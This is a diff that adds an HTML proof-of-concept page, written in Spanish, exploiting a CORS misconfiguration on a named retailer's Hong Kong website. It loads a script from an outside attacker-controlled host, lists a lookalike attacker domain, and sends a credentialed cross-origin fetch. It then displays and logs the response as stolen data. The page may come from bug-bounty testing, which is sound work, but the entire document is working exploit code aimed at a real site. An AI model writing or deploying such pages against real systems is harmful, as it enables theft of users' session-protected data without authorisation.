@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC Exploit - Adidas HK</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .container { max-width: 800px; margin: auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; }
+        #status { font-weight: bold; color: #d9534f; }
+        #data-output { background: #f4f4f4; border: 1px solid #ddd; padding: 10px; height: 300px; overflow-y: scroll; font-family: monospace; font-size: 12px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>CORS Misconfiguration PoC</h1>
+    <p><strong>Dominio Atacante:</strong> google.com.xsshexpresx.bugtatsu.xyz</p>
+    <p>Estado del ataque: <span id="status">Iniciando...</span></p>
+    
+    <button onclick="startExploit()">Ejecutar Robo de Datos</button>
+    
+    <h3>Respuesta del Servidor Adidas:</h3>
+    <div id="data-output">Esperando ejecución...</div>
+</div>
+
+<script src="https://xsshexpresx.bugtatsu.xyz/m.js"></script>
+
+<script>
+    function startExploit() {
+        const output = document.getElementById('data-output');
+        const status = document.getElementById('status');
+        
+        status.innerText = "Enviando petición con credenciales...";
+
+        // Intentamos leer un endpoint de Adidas
+        // Si el CORS es vulnerable, el navegador nos dará el contenido
+        fetch('https://www.adidas.com.hk/en/contactus', {
+            method: 'GET',
+            credentials: 'include' // Obligatorio para enviar cookies de sesión
+        })
+        .then(response => {
+            if (response.ok) {
+                status.innerText = "¡VULNERABLE! Datos extraídos con éxito.";
+                return response.text();
+            } else {
+                status.innerText = "Error: " + response.status + " (El WAF bloqueó la lectura)";
+                return response.text();
+            }
+        })
+        .then(data => {
+            // Mostramos el código fuente robado en la pantalla
+            output.innerText = data;
+            console.log("Datos robados:", data);
+        })
+        .catch(err => {
+            status.innerText = "Fallo en la conexión.";
+            output.innerText = "Error de red: " + err;
+        });
+    }
+</script>
+
+</body>
+</html>
